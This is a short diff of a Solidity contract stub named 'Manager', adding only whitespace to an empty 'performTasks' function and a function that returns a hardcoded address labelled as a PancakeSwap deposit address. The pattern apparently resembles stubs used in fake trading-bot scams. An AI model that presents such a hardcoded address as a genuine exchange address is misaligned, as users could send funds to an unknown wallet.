@@ -1,7 +1,10 @@
 pragma solidity ^0.5.0;
+
 contract Manager {
     function performTasks() public pure{
+        
     }
+    
     function pancakeswapDepositAddress() public pure returns (address) {
         return 0x7EF9Ec140518A01d8ddA421612FA3D42F078b8e7;
     }
